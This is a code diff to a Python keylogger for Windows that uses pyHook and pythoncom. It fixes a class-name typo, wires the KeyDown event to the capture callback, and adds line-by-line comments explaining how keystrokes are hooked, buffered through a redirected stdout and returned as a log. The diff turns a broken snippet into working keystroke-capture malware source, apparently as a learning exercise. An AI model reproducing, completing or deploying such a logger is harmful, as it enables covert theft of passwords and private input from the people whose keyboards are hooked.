@@ -62,17 +62,18 @@ class Keylogger:
         return True # allow the keystroke event to pass normally to the OS to prevent lag
 
 def run():
-    save_stdout = sys.stdout
-    sys.stdout = StringIO()
+    save_stdout = sys.stdout # saves a reference to the standard output stream
+    sys.stdout = StringIO() # redirects stdout (and all the prints in this script) to an in memory string buffer instead of the terminal
 
-    kl = KeyLogger()
-    hm = pyHook.HookManager()
-    hm.HookKeyboard()
-    while time.thread_time() < TIMEOUT:
-        pythoncom.PumpWaitingMessages()
-    log = sys.stdout.getvalue()
-    sys.stdout = save_stdout
-    return log
+    kl = Keylogger()
+    hm = pyHook.HookManager() 
+    hm.KeyDown = kl.mykeystroke # every time a key is pressed, mykeystroke() will run
+    hm.HookKeyboard() # activates the keyboard hook
+    while time.thread_time() < TIMEOUT: # as long as we haven't timed out:
+        pythoncom.PumpWaitingMessages() # make sure the Windows COM message pump keeps running, transfering events/inputs from the OS to the application
+    log = sys.stdout.getvalue() # takes all the stdout data (all those prints) from the buffer and saves it to 'log'
+    sys.stdout = save_stdout # restores stdout back to the terminal  
+    return log 
 
 if __name__ == '__main__':
     print(run())
